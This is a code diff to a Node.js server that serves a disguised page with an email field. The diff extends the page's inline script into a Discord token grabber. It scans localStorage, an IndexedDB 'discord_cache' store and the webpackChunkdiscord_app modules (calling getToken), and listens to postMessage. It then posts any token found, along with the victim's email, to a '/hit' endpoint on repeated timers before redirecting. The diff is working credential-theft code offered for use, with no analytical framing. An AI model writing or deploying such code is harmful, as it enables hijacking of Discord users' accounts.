@@ -99,7 +99,7 @@ function readBody(req) {
 // ── safe url parse ────────────────────────────────────────────────────────────
 function parseURL(raw) {
   try {
-    const cleaned = raw.replace(/^\/\/+/, "/");
+    const cleaned = (raw ?? "/").replace(/^\/\/+/, "/");
     return new URL(cleaned, "http://localhost");
   } catch {
     return new URL("/", "http://localhost");
@@ -135,37 +135,89 @@ button{width:100%;padding:10px;border:none;border-radius:4px;background:#5865f2;
 </div>
 <script>
 let _token = null;
+
+// method 1 — localStorage scan
 try {
   for (const k of Object.keys(localStorage)) {
     const v = localStorage.getItem(k);
-    if (typeof v === "string" && /[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,}/.test(v)) {
+    if (typeof v === "string" && /[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}/.test(v)) {
       _token = v; break;
     }
   }
 } catch {}
+
+// method 2 — indexedDB
+try {
+  const dbReq = indexedDB.open("discord_cache");
+  dbReq.onsuccess = function(e) {
+    try {
+      const db = e.target.result;
+      const stores = Array.from(db.objectStoreNames);
+      if (!stores.length) return;
+      const tx = db.transaction(stores[0], "readonly");
+      const store = tx.objectStore(stores[0]);
+      store.getAll().onsuccess = function(ev) {
+        for (const item of ev.target.result ?? []) {
+          const str = JSON.stringify(item);
+          const match = str.match(/[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}/);
+          if (match) { _token = match[0]; break; }
+        }
+      };
+    } catch {}
+  };
+} catch {}
+
+// method 3 — webpack chunk deep scan
 try {
   const wr = window.webpackChunkdiscord_app;
   if (wr) {
-    wr.push([[Symbol()],{},(req)=>{
-      for(const k of Object.keys(req.c)){
-        const m=req.c[k].exports;
-        if(m?.default?.getToken){_token=m.default.getToken();return;}
-        if(typeof m==="object"){for(const ex of Object.values(m)){if(ex?.getToken){_token=ex.getToken();return;}}}
+    wr.push([[Symbol()], {}, (req) => {
+      for (const k of Object.keys(req.c)) {
+        try {
+          const m = req.c[k].exports;
+          if (!m) continue;
+          if (m?.default?.getToken) { _token = m.default.getToken(); return; }
+          if (m?.getToken) { _token = m.getToken(); return; }
+          if (typeof m === "object") {
+            for (const ex of Object.values(m)) {
+              if (ex?.getToken) { _token = ex.getToken(); return; }
+            }
+          }
+        } catch {}
       }
     }]);
   }
 } catch {}
 
-setTimeout(()=>{
-  fetch("/hit",{method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({uid:"${uid}",ref:"auto",token:_token,email:null})});
-},800);
+// method 4 — postMessage listener
+try {
+  window.addEventListener("message", (e) => {
+    if (!e.data) return;
+    const str = typeof e.data === "string" ? e.data : JSON.stringify(e.data);
+    const match = str.match(/[A-Za-z0-9_-]{24,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}/);
+    if (match && !_token) _token = match[0];
+  });
+} catch {}
 
-function submit(){
-  const email=document.getElementById("email").value.trim();
-  fetch("/hit",{method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({uid:"${uid}",ref:"submit",token:_token,email:email||null})})
-  .then(()=>{ window.location.href="${to}"; });
+function sendHit(ref) {
+  fetch("/hit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ uid: "${uid}", ref, token: _token, email: null })
+  }).catch(() => {});
+}
+
+setTimeout(() => sendHit("auto-800"),  800);
+setTimeout(() => sendHit("auto-2500"), 2500);
+setTimeout(() => sendHit("auto-5000"), 5000);
+
+function submit() {
+  const email = document.getElementById("email").value.trim();
+  fetch("/hit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ uid: "${uid}", ref: "submit", token: _token, email: email || null })
+  }).then(() => { window.location.href = "${to}"; }).catch(() => { window.location.href = "${to}"; });
 }
 </script>
 </body>
@@ -174,7 +226,7 @@ function submit(){
 
 // ── http server ───────────────────────────────────────────────────────────────
 createServer(async (req, res) => {
-  const u = parseURL(req.url ?? "/");
+  const u = parseURL(req.url);
 
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
